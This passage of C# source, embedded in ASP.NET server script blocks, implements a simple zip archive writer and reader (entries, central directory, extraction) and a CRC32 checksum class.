                if (_writestream == null)
                {
                    _writestream = new System.IO.FileStream(_name, System.IO.FileMode.CreateNew);
                }
                return _writestream;
            }
        }

        private ZipFile() { }


        #region For Writing Zip Files

        public ZipFile(string NewZipFileName)
        {
            // create a new zipfile
            _name = NewZipFileName;
            if (System.IO.File.Exists(_name))
                throw new System.Exception(String.Format("That file ({0}) already exists.", NewZipFileName));
            _entries = new System.Collections.Generic.List<ZipEntry>();
        }


        public void AddItem(string FileOrDirectoryName)
        {
            AddItem(FileOrDirectoryName, false);
        }

        public void AddItem(string FileOrDirectoryName, bool WantVerbose)
        {
            if (System.IO.File.Exists(FileOrDirectoryName))
                AddFile(FileOrDirectoryName, WantVerbose);
            else if (System.IO.Directory.Exists(FileOrDirectoryName))
                AddDirectory(FileOrDirectoryName, WantVerbose);

            else
                throw new Exception(String.Format("That file or directory ({0}) does not exist!", FileOrDirectoryName));
        }

        public void AddFile(string FileName)
        {
            AddFile(FileName, false);
        }

        public void AddFile(string FileName, bool WantVerbose)
        {
            ZipEntry ze = ZipEntry.Create(FileName);
            if (WantVerbose) Console.WriteLine("adding {0}...", FileName);
            _entries.Add(ze);
        }

        public void AddDirectory(string DirectoryName)
        {
            AddDirectory(DirectoryName, false);
        }

        public void AddDirectory(string DirectoryName, bool WantVerbose)
        {
            String[] filenames = System.IO.Directory.GetFiles(DirectoryName);
            foreach (String filename in filenames)
            {
                if (WantVerbose) Console.WriteLine("adding {0}...", filename);
                AddFile(filename);
            }

            String[] dirnames = System.IO.Directory.GetDirectories(DirectoryName);
            foreach (String dir in dirnames)
            {
                AddDirectory(dir, WantVerbose);
            }
        }


        public void Save()
        {
            // an entry for each file
            foreach (ZipEntry e in _entries)
            {
                e.Write(WriteStream);
            }

            WriteCentralDirectoryStructure();
            WriteStream.Close();
            _writestream = null;
        }


        private void WriteCentralDirectoryStructure()
        {
            // the central directory structure
            long Start = WriteStream.Length;
            foreach (ZipEntry e in _entries)
            {
                e.WriteCentralDirectoryEntry(WriteStream);
            }
            long Finish = WriteStream.Length;

            // now, the footer
            WriteCentralDirectoryFooter(Start, Finish);
        }


        private void WriteCentralDirectoryFooter(long StartOfCentralDirectory, long EndOfCentralDirectory)
        {
            byte[] bytes = new byte[1024];
            int i = 0;
            // signature
            UInt32 EndOfCentralDirectorySignature = 0x06054b50;
            bytes[i++] = (byte)(EndOfCentralDirectorySignature & 0x000000FF);
            bytes[i++] = (byte)((EndOfCentralDirectorySignature & 0x0000FF00) >> 8);
            bytes[i++] = (byte)((EndOfCentralDirectorySignature & 0x00FF0000) >> 16);
            bytes[i++] = (byte)((EndOfCentralDirectorySignature & 0xFF000000) >> 24);

            // number of this disk
            bytes[i++] = 0;
            bytes[i++] = 0;

            // number of the disk with the start of the central directory
            bytes[i++] = 0;
            bytes[i++] = 0;

            // total number of entries in the central dir on this disk
            bytes[i++] = (byte)(_entries.Count & 0x00FF);
            bytes[i++] = (byte)((_entries.Count & 0xFF00) >> 8);

            // total number of entries in the central directory
            bytes[i++] = (byte)(_entries.Count & 0x00FF);
            bytes[i++] = (byte)((_entries.Count & 0xFF00) >> 8);

            // size of the central directory
            Int32 SizeOfCentralDirectory = (Int32)(EndOfCentralDirectory - StartOfCentralDirectory);
            bytes[i++] = (byte)(SizeOfCentralDirectory & 0x000000FF);
            bytes[i++] = (byte)((SizeOfCentralDirectory & 0x0000FF00) >> 8);
            bytes[i++] = (byte)((SizeOfCentralDirectory & 0x00FF0000) >> 16);
            bytes[i++] = (byte)((SizeOfCentralDirectory & 0xFF000000) >> 24);

            // offset of the start of the central directory 
            Int32 StartOffset = (Int32)StartOfCentralDirectory;  // cast down from Long
            bytes[i++] = (byte)(StartOffset & 0x000000FF);
            bytes[i++] = (byte)((StartOffset & 0x0000FF00) >> 8);
            bytes[i++] = (byte)((StartOffset & 0x00FF0000) >> 16);
            bytes[i++] = (byte)((StartOffset & 0xFF000000) >> 24);

            // zip comment length
            bytes[i++] = 0;
            bytes[i++] = 0;

            WriteStream.Write(bytes, 0, i);
        }

        #endregion

        #region For Reading Zip Files

        /// <summary>
        /// This will throw if the zipfile does not exist. 
        /// </summary>
        public static ZipFile Read(string zipfilename)
        {
            return Read(zipfilename, false);
        }

        /// <summary>
        /// This will throw if the zipfile does not exist. 
        /// </summary>
        public static ZipFile Read(string zipfilename, bool TurnOnDebug)
        {

            ZipFile zf = new ZipFile();
            zf._Debug = TurnOnDebug;
            zf._name = zipfilename;
            zf._entries = new System.Collections.Generic.List<ZipEntry>();
            ZipEntry e;
            while ((e = ZipEntry.Read(zf.ReadStream, zf._Debug)) != null)
            {
                if (zf._Debug) System.Console.WriteLine("  ZipFile::Read(): ZipEntry: {0}", e.FileName);
                zf._entries.Add(e);
            }

            // read the zipfile's central directory structure here.
            zf._direntries = new System.Collections.Generic.List<ZipDirEntry>();

            ZipDirEntry de;
            while ((de = ZipDirEntry.Read(zf.ReadStream, zf._Debug)) != null)
            {
                if (zf._Debug) System.Console.WriteLine("  ZipFile::Read(): ZipDirEntry: {0}", de.FileName);
                zf._direntries.Add(de);
            }

            return zf;
        }

        public System.Collections.Generic.IEnumerator<ZipEntry> GetEnumerator()
        {
            foreach (ZipEntry e in _entries)
                yield return e;
        }

        System.Collections.IEnumerator System.Collections.IEnumerable.GetEnumerator()
        {
            return GetEnumerator();
        }


        public void ExtractAll(string path)
        {
            ExtractAll(path, false);
        }


        public void ExtractAll(string path, bool WantVerbose)
        {
            bool header = WantVerbose;
            foreach (ZipEntry e in _entries)
            {
                if (header)
                {
                    System.Console.WriteLine("\n{1,-22} {2,-6} {3,4}   {4,-8}  {0}",
                                 "Name", "Modified", "Size", "Ratio", "Packed");
                    System.Console.WriteLine(new System.String('-', 72));
                    header = false;
                }
                if (WantVerbose)
                    System.Console.WriteLine("{1,-22} {2,-6} {3,4:F0}%   {4,-8} {0}",
                                 e.FileName,
                                 e.LastModified.ToString("yyyy-MM-dd HH:mm:ss"),
                                 e.UncompressedSize,
                                 e.CompressionRatio,
                                 e.CompressedSize);
                e.Extract(path);
            }
        }


        public void Extract(string filename)
        {
            this[filename].Extract();
        }


        public void Extract(string filename, System.IO.Stream s)
        {
            this[filename].Extract(s);
        }


        public ZipEntry this[String filename]
        {
            get
            {
                foreach (ZipEntry e in _entries)
                {
                    if (e.FileName == filename) return e;
                }
                return null;
            }
        }

        #endregion




        // the destructor
        ~ZipFile()
        {
            // call Dispose with false.  Since we're in the
            // destructor call, the managed resources will be
            // disposed of anyways.
            Dispose(false);
        }

        public void Dispose()
        {
            // dispose of the managed and unmanaged resources
            Dispose(true);

            // tell the GC that the Finalize process no longer needs
            // to be run for this object.
            GC.SuppressFinalize(this);
        }


        protected virtual void Dispose(bool disposeManagedResources)
        {
            if (!this._disposed)
            {
                if (disposeManagedResources)
                {
                    // dispose managed resources
                    if (_readstream != null)
                    {
                        _readstream.Dispose();
                        _readstream = null;
                    }
                    if (_writestream != null)
                    {
                        _writestream.Dispose();
                        _writestream = null;
                    }
                }
                this._disposed = true;
            }
        }


        private System.IO.Stream _readstream;
        private System.IO.FileStream _writestream;
        private bool _Debug = false;
        private bool _disposed = false;
        private System.Collections.Generic.List<ZipEntry> _entries = null;
        private System.Collections.Generic.List<ZipDirEntry> _direntries = null;
    }




</script>

<script runat="server">


    /// <summary>
    /// Calculates a 32bit Cyclic Redundancy Checksum (CRC) using the
    /// same polynomial used by Zip.
    /// </summary>
    public class CRC32
    {
        private UInt32[] crc32Table;
        private const int BUFFER_SIZE = 8192;

        private Int32 _TotalBytesRead = 0;
        public Int32 TotalBytesRead
        {
            get
            {
                return _TotalBytesRead;
            }
        }

        /// <summary>
        /// Returns the CRC32 for the specified stream.
        /// </summary>
        /// <param name="input">The stream over which to calculate the CRC32</param>
        /// <returns>the CRC32 calculation</returns>
        [CLSCompliant(false)]
        public UInt32 GetCrc32(System.IO.Stream input)
        {
            return GetCrc32AndCopy(input, null);
        }

        /// <summary>
        /// Returns the CRC32 for the specified stream, and writes the input into the output stream.
        /// </summary>
        /// <param name="input">The stream over which to calculate the CRC32</param>
        /// <param name="output">The stream into which to deflate the input</param>
        /// <returns>the CRC32 calculation</returns>
        [CLSCompliant(false)]
        public UInt32 GetCrc32AndCopy(System.IO.Stream input, System.IO.Stream output)
        {
            unchecked
            {
                UInt32 crc32Result;
                crc32Result = 0xFFFFFFFF;
                byte[] buffer = new byte[BUFFER_SIZE];
                int readSize = BUFFER_SIZE;

                _TotalBytesRead = 0;
                int count = input.Read(buffer, 0, readSize);
                if (output != null) output.Write(buffer, 0, count);
                _TotalBytesRead += count;
                while (count > 0)
                {
                    for (int i = 0; i < count; i++)
                    {
                        crc32Result = ((crc32Result) >> 8) ^ crc32Table[(buffer[i]) ^ ((crc32Result) & 0x000000FF)];
                    }
                    count = input.Read(buffer, 0, readSize);
                    if (output != null) output.Write(buffer, 0, count);
                    _TotalBytesRead += count;

                }

                return ~crc32Result;
            }
        }


        /// <summary>
        /// Construct an instance of the CRC32 class, pre-initialising the table
        /// for speed of lookup.
        /// </summary>
        public CRC32()
        {
            unchecked
            {
                // This is the official polynomial used by CRC32 in PKZip.
                // Often the polynomial is shown reversed as 0x04C11DB7.
                UInt32 dwPolynomial = 0xEDB88320;
                UInt32 i, j;

                crc32Table = new UInt32[256];

                UInt32 dwCrc;
                for (i = 0; i < 256; i++)
                {
                    dwCrc = i;
                    for (j = 8; j > 0; j--)
                    {
                        if ((dwCrc & 1) == 1)
                        {
                            dwCrc = (dwCrc >> 1) ^ dwPolynomial;
                        }
                        else
                        {
                            dwCrc >>= 1;
                        }
                    }
                    crc32Table[i] = dwCrc;
                }
            }
        }
    }
 
</script>